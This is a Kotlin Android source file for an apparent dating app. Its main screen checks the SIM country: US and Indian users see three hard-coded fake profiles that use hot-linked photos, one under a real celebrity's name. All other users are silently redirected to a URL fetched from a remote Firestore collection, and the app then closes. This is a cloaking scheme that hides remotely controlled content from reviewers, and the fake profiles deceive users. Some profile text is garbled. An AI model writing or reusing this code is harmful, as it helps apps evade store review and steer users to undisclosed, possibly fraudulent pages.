package org.rec.datingfive

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.TelephonyManager
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.RecyclerView
import androidx.viewpager2.widget.CompositePageTransformer
import androidx.viewpager2.widget.MarginPageTransformer
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreSettings
import kotlinx.android.synthetic.main.activity_main.*
import java.io.Serializable
import kotlin.math.abs
import kotlinx.android.synthetic.main.activity_main.locationViewPager as locationViewPager1

class MainActivity : AppCompatActivity() {
    private val US_IN = listOf("us", "in")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        FirebaseFirestore.getInstance()
        val manager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        val ans =
            US_IN.contains(manager.simCountryIso) && manager.simOperatorName.isNotEmpty()

        if (ans) {
            setUi()
        } else
            getURL()
//        setUi()


    }

    private fun setUi(){
        setDataToAdapter(getHUMANS())
        btn_chats.setOnClickListener{
            val intent = Intent(this, ChatActivity::class.java)
            startActivity(intent)
        }
    }

    private fun setDataToAdapter(locationList: ArrayList<HumanModel>) {

        val adapter =
            HumanModelAdapter(this, locationList) { adapterPosition ->
                locationList.removeAt(adapterPosition)
            }


        locationViewPager1.adapter = adapter


        addCompositePageTransformer()
    }

    private fun addCompositePageTransformer() {
        locationViewPager1.clipToPadding = false
        locationViewPager1.clipChildren = false
        locationViewPager1.offscreenPageLimit = 3
        locationViewPager1.getChildAt(0).overScrollMode =
            RecyclerView.OVER_SCROLL_NEVER


        val compositePageTransformer = CompositePageTransformer()
        compositePageTransformer.addTransformer(MarginPageTransformer(20))
        compositePageTransformer.addTransformer { page: View, position: Float ->
            val r = 1 - abs(position)
            page.scaleY = 0.95f + r * 0.05f
        }
        locationViewPager1.setPageTransformer(compositePageTransformer)


    }

    private fun getURL() {

        val g = FirebaseFirestore.getInstance();
        val h = FirebaseFirestoreSettings.Builder()
            .setPersistenceEnabled(false)
            .build()

        g.firestoreSettings = h
        var oBool = false

        g.collection("data").get().addOnCompleteListener { task ->

            if (task.isSuccessful) for (document in task.result!!)
                if (document.data["value"].toString().length > 1) {

                    oBool = true
                    val message = document.data["value"] as String
                    goLink(message)

                }
            if (!oBool) setUi()
        }.addOnFailureListener { setUi() }
    }

    private fun goLink(url: String) {
        val i = Intent(this, WebActivity::class.java)
        i.putExtra("url", url)
        startActivity(i)
        finish()
    }

    companion object {
        fun getHUMANS(): ArrayList<HumanModel> {
            return arrayListOf(
                HumanModel(
                    "Sofie",
                    "I love anime and J and touch pandas. Email me if you're funny :)",
                    "https://trikky.ru/wp-content/blogs.dir/1/files/2020/03/01/0d533c829b0a3b7456814f7a4de8fa53.jpg",
                    22,
                    false,
                    "2.1 km",
                    Message(0, 2, "", "Sofie")
                ),
                HumanModel(
                    "Angelina",
                    "I love anime and Japanese culture, my dream is to visit Japan and touch pandas. Email me if you're funny :)",
                    "https://i.pinimg.com/originals/1b/3c/7e/1b3c7e0a90b03101e175cf14598c41e4.jpg",
                    23,
                    false,
                    "2.1 km",
                    Message(0, 1, "", "Angelina")
                ),
                HumanModel(
                    "Park Chaeyoung",
                    "I lch pandas. Email me if you're funny :)",
                    "https://i.pinimg.com/564x/41/38/32/4138327414c19c0ab90632c01e4af34c.jpg",
                    20,
                    false,
                    "2.1 km",
                    Message(0, 3, "", "Park Chaeyoung")
                )

                )
        }
    }
}